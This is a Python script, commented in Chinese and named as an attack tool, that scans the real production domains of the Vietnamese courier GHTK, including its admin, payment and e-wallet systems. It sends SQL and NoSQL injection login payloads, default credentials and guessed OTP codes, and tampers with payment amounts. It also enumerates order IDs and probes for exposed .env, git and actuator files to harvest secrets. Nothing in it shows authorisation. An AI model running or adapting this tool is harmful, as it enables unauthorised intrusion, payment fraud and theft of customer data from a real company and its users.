#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 GHTK (Giao Hang Tiet Kiem) API 完整漏洞扫描工具
基于深度逆向分析 - EComShop应用
"""

import requests
import json
from typing import Dict, List
import urllib3
urllib3.disable_warnings()

class GHTKAPIExploit:
    """GHTK API攻击工具"""
    
    def __init__(self):
        self.domains = {
            'services': 'https://services.giaohangtietkiem.vn',
            'web': 'https://web.giaohangtietkiem.vn',
            'admin': 'https://admin.giaohangtietkiem.vn',
            'auth': 'https://auth.giaohangtietkiem.vn',
            'stats': 'https://stats.ghtk.vn',
            'xteam': 'https://xteam.ghtk.vn',
            'payment': 'https://ghtk-payment-gateway.ghtk.vn',
            'ewallet': 'https://ewallet-gateway.ghtkpay.vn',
            'cod': 'https://codlocation.ghtk.vn',
            'customer': 'https://khachhang.giaohangtietkiem.vn',
            'www': 'https://www.ghtk.com'
        }
        
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'EComShop-Android/1.0',
            'Content-Type': 'application/json'
        })
        
        # 从逆向分析提取的API端点
        self.endpoints = {
            # 认证相关
            'auth_login': '/api/auth/login',
            'auth_login_token': '/auth/loginByToken',
            'auth_ekyc': '/api/v1/authn/ekyc/',
            'otp_send': '/api/v1/sms-otp/send',
            'otp_verify': '/api/v1/sotp/verify',
            
            # 支付相关
            'wallet_gate_pay': '/wallet_gate_pay',
            'bank_info': '/finance/bank/',
            'ewallet_otp_send': '/user/otp/send',
            
            # COD系统
            'cod_batch_push': '/api/v3/cods/batch/push',
            
            # 其他
            'channel_multi_select': '/channel_multiple_selection/',
            'forget_password': '/forget_password',
            'api_v1': '/api/v1/',
            'api_v2': '/api/v2/'
        }
        
        self.vulnerabilities = []
    
    def test_login_bypass(self, domain_key: str) -> List[Dict]:
        """测试登录绕过"""
        print(f"\n[*] 测试 {domain_key} 登录绕过...")
        
        domain = self.domains.get(domain_key)
        if not domain:
            return []
        
        results = []
        
        # 测试SQL注入
        sql_payloads = [
            {"username": "admin' OR '1'='1", "password": "admin"},
            {"email": "admin@ghtk.vn' OR '1'='1' --", "password": "test"},
            {"phone": "0901234567' OR '1'='1'--", "password": "test"}
        ]
        
        # 测试NoSQL注入
        nosql_payloads = [
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"email": {"$gt": ""}, "password": {"$gt": ""}},
        ]
        
        # 测试空/默认凭证
        default_creds = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "123456"},
            {"username": "test", "password": "test"},
            {"email": "admin@ghtk.vn", "password": "admin123"},
        ]
        
        all_payloads = sql_payloads + nosql_payloads + default_creds
        
        for payload in all_payloads:
            try:
                url = domain + '/api/auth/login'
                resp = self.session.post(url, json=payload, timeout=10)
                
                if resp.status_code == 200:
                    results.append({
                        'type': 'LOGIN_BYPASS',
                        'domain': domain,
                        'payload': str(payload),
                        'status': resp.status_code,
                        'response': resp.text[:500]
                    })
                    print(f"[!!!] 登录绕过成功! Payload: {payload}")
                    
            except Exception as e:
                pass
        
        return results
    
    def test_admin_access(self) -> List[Dict]:
        """测试管理后台未授权访问"""
        print(f"\n[*] 测试管理后台访问...")
        
        results = []
        admin_domain = self.domains['admin']
        
        # 常见管理路径
        admin_paths = [
            '/admin',
            '/admin/dashboard',
            '/admin/users',
            '/admin/orders',
            '/admin/settings',
            '/api/admin/users',
            '/api/admin/stats',
            '/backend',
            '/manage',
            '/console',
            '/auth/loginByToken?token=',
            '/auth/loginByToken?token=admin',
            '/auth/loginByToken?token=test123'
        ]
        
        for path in admin_paths:
            try:
                url = admin_domain + path
                resp = self.session.get(url, timeout=10)
                
                # 检查是否返回敏感信息
                if resp.status_code in [200, 301, 302]:
                    sensitive_keywords = ['dashboard', 'user', 'admin', 'data', 'config']
                    if any(kw in resp.text.lower() for kw in sensitive_keywords):
                        results.append({
                            'type': 'ADMIN_ACCESS',
                            'url': url,
                            'status': resp.status_code,
                            'length': len(resp.text)
                        })
                        print(f"[+] 发现可访问管理路径: {path} ({resp.status_code})")
                        
            except:
                pass
        
        return results
    
    def test_idor_vulnerabilities(self) -> List[Dict]:
        """测试IDOR漏洞"""
        print(f"\n[*] 测试IDOR漏洞...")
        
        results = []
        
        # 测试订单ID枚举
        order_endpoints = [
            '/api/v1/orders/',
            '/api/v2/orders/',
            '/api/orders/detail/',
            '/api/shipments/',
        ]
        
        test_ids = [1, 100, 1000, 'GH001', 'ORDER123']
        
        for endpoint in order_endpoints:
            for order_id in test_ids:
                try:
                    url = self.domains['web'] + endpoint + str(order_id)
                    resp = self.session.get(url, timeout=10)
                    
                    if resp.status_code == 200:
                        results.append({
                            'type': 'IDOR',
                            'endpoint': endpoint,
                            'id': order_id,
                            'status': resp.status_code
                        })
                        print(f"[!!!] IDOR发现! {endpoint}{order_id}")
                        
                except:
                    pass
        
        return results
    
    def test_api_key_exposure(self) -> List[Dict]:
        """测试API密钥泄露"""
        print(f"\n[*] 测试API密钥泄露...")
        
        results = []
        
        # 常见配置文件路径
        config_paths = [
            '/.env',
            '/config.json',
            '/app/config.json',
            '/api/config',
            '/.git/config',
            '/swagger.json',
            '/api-docs',
            '/api/swagger',
            '/graphql'
        ]
        
        for domain_key, domain in self.domains.items():
            for path in config_paths:
                try:
                    url = domain + path
                    resp = self.session.get(url, timeout=10)
                    
                    if resp.status_code == 200:
                        # 检查是否包含敏感信息
                        sensitive = ['api_key', 'secret', 'password', 'token', 'private']
                        if any(kw in resp.text.lower() for kw in sensitive):
                            results.append({
                                'type': 'CONFIG_EXPOSURE',
                                'domain': domain,
                                'path': path,
                                'content': resp.text[:500]
                            })
                            print(f"[!!!] 配置文件泄露! {domain}{path}")
                            
                except:
                    pass
        
        return results
    
    def test_payment_vulnerabilities(self) -> List[Dict]:
        """测试支付系统漏洞"""
        print(f"\n[*] 测试支付系统...")
        
        results = []
        payment_domain = self.domains['payment']
        ewallet_domain = self.domains['ewallet']
        
        # 测试金额篡改
        payment_payloads = [
            {"amount": -100},  # 负数金额
            {"amount": 0},     # 零金额
            {"amount": 0.01},  # 极小金额
            {"amount": "0x10"}, # 十六进制
        ]
        
        # 测试OTP绕过
        otp_tests = [
            {"otp": "000000"},
            {"otp": "123456"},
            {"otp": "999999"},
            {}  # 空OTP
        ]
        
        for payload in payment_payloads:
            try:
                url = payment_domain + '/api/payment/create'
                resp = self.session.post(url, json=payload, timeout=10)
                
                if resp.status_code in [200, 201]:
                    results.append({
                        'type': 'PAYMENT_VULN',
                        'payload': payload,
                        'status': resp.status_code
                    })
                    print(f"[!!!] 支付漏洞! Payload: {payload}")
                    
            except:
                pass
        
        return results
    
    def test_information_disclosure(self) -> List[Dict]:
        """测试信息泄露"""
        print(f"\n[*] 测试信息泄露...")
        
        results = []
        
        # 常见信息泄露端点
        disclosure_paths = [
            '/api/users',
            '/api/v1/users',
            '/api/customers',
            '/api/orders',
            '/api/statistics',
            '/api/reports',
            '/api/export',
            '/api/download',
            '/.git/HEAD',
            '/phpinfo.php',
            '/info.php',
            '/server-status',
            '/actuator/health',
            '/actuator/env'
        ]
        
        for domain_key, domain in list(self.domains.items())[:3]:  # 限制测试范围
            for path in disclosure_paths:
                try:
                    url = domain + path
                    resp = self.session.get(url, timeout=10)
                    
                    if resp.status_code == 200 and len(resp.text) > 100:
                        results.append({
                            'type': 'INFO_DISCLOSURE',
                            'domain': domain,
                            'path': path,
                            'size': len(resp.text)
                        })
                        print(f"[+] 信息泄露: {path} ({len(resp.text)} bytes)")
                        
                except:
                    pass
        
        return results
    
    def full_vulnerability_scan(self) -> Dict:
        """完整漏洞扫描"""
        print("\n" + "="*70)
        print("🔥 GHTK (Giao Hang Tiet Kiem) 完整漏洞扫描")
        print("目标系统: 越南快递电商平台")
        print("="*70)
        
        all_results = {
            'login_bypass': [],
            'admin_access': [],
            'idor': [],
            'api_key_exposure': [],
            'payment_vulns': [],
            'info_disclosure': []
        }
        
        # 1. 登录绕过测试
        print("\n[1] 测试认证绕过...")
        for domain_key in ['auth', 'stats', 'xteam']:
            all_results['login_bypass'].extend(self.test_login_bypass(domain_key))
        
        # 2. 管理后台测试
        print("\n[2] 测试管理后台访问...")
        all_results['admin_access'] = self.test_admin_access()
        
        # 3. IDOR测试
        print("\n[3] 测试IDOR漏洞...")
        all_results['idor'] = self.test_idor_vulnerabilities()
        
        # 4. API密钥泄露
        print("\n[4] 测试API密钥泄露...")
        all_results['api_key_exposure'] = self.test_api_key_exposure()
        
        # 5. 支付系统
        print("\n[5] 测试支付系统...")
        all_results['payment_vulns'] = self.test_payment_vulnerabilities()
        
        # 6. 信息泄露
        print("\n[6] 测试信息泄露...")
        all_results['info_disclosure'] = self.test_information_disclosure()
        
        # 生成报告
        self._generate_report(all_results)
        
        return all_results
    
    def _generate_report(self, results: Dict):
        """生成报告"""
        print("\n" + "="*70)
        print("📊 GHTK 漏洞扫描报告")
        print("="*70)
        
        total_vulns = sum(len(v) for v in results.values())
        
        print(f"\n总发现漏洞: {total_vulns}")
        print(f"  登录绕过: {len(results['login_bypass'])}")
        print(f"  管理后台访问: {len(results['admin_access'])}")
        print(f"  IDOR漏洞: {len(results['idor'])}")
        print(f"  API密钥泄露: {len(results['api_key_exposure'])}")
        print(f"  支付系统漏洞: {len(results['payment_vulns'])}")
        print(f"  信息泄露: {len(results['info_disclosure'])}")
        
        # 保存详细报告
        with open('ghtk_vulnerability_report.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print("\n[✓] 详细报告已保存到: ghtk_vulnerability_report.json")
        
        # 高危漏洞提示
        if total_vulns > 0:
            print("\n⚠️  发现高危漏洞！建议立即修复")


if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════════════╗
║  🔥 GHTK (Giao Hang Tiet Kiem) 完整漏洞扫描工具 🔥        ║
║  基于 EComShop 应用深度逆向分析                                ║
║  目标: 越南最大快递电商平台                                    ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    exploit = GHTKAPIExploit()
    results = exploit.full_vulnerability_scan()
    
    print("\n[*] 扫描完成！")
